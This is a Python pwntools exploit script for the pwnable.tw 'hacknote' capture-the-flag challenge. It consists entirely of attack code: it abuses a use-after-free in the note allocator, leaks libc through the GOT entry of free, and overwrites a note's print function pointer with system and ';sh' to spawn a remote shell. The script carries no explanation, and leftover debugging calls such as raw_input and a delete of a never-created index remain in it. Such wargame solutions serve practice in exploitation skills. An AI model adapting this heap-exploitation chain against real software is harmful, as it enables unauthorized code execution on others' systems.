from pwn import *
from ctypes import *
import os

remote_addr = "chall.pwnable.tw"
remote_port = 10102
pc = "./hacknote"

uselibc = 1 #0 for no,1 for i386,2 for x64
local = 0
haslibc = 1
atta = 0

if uselibc == 2:
	context.arch = "amd64"
else:
	context.arch = "i386"

if uselibc ==2 and haslibc == 0:
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
else:
	if uselibc == 1 and haslibc == 0:
		libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')
	else:
		libc = ELF('./libc.so.6')

if local == 1:
	if haslibc:
		p = process(pc,env={'LD_PRELOAD':'./libc.so.6'})
	else:
		p = process(pc)
else:
	p = remote(remote_addr,remote_port)
	if haslibc:
		libc = ELF('./libc.so.6')

context.log_level = True

if local:
	if atta:
		gdb.attach(p,'b *0x8048A5A')
		#0x400b6a

def ru(a):
	return p.recvuntil(a)

def sn(a):
	p.send(a)

def rl():
	return p.recvline()

def sl(a):
	p.sendline(a)

def rv(a):
	return p.recv(a)

def raddr(a,l=None):
	if l == None:
		return u64(rv(a).ljust(8,'\x00'))
	else:
		return u64(rl().strip('\n').ljust(8,'\x00'))

def lg(s,addr):
	print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))

def sa(a,b):
	p.sendafter(a,b)

def sla(a,b):
	p.sendlineafter(a,b)

def addnote(size,content):
	sla('choice :','1')
	sleep(0.2)
	sla('size :',str(size))
	sleep(0.2)
	sla('Content :',content)
	sleep(0.2)

def deletenote(i):
	sla('choice :','2')
	sleep(0.2)
	sla('Index :',str(i))
	sleep(0.2)

def printnote(i):
	sla('choice :','3')
	sleep(0.2)
	sla('Index :',str(i))
	sleep(0.2)

def hack():
	#raw_input()
	free_got = 0x0804A018
	#read_got = 0x0804a00c
	addnote(0x60,'AAAA')
	addnote(0x60,'AAAA')
	addnote(0x60,'AAAA')

	deletenote(0)
	deletenote(1)
	
	payload = p32(0x0804862B) + p32(free_got)
	addnote(0x8,payload)
	
	printnote(0)
	
	free_addr = u32(rl()[0:4])
	#lg("func_show",func_show)
	raw_input()
	lg("free_addr",free_addr)
	libc.address = free_addr - libc.symbols['free']
	lg("libc.addr",libc.address)
	system_addr = libc.symbols['system']
	lg("system_addr",system_addr)
	deletenote(3)
	deletenote(2)

	addnote(0x8,p32(system_addr)+ ";sh\x00")
	printnote(0)


	#payload = 
	#addnote(0x1c,'')
	#rl()
	p.interactive()

hack()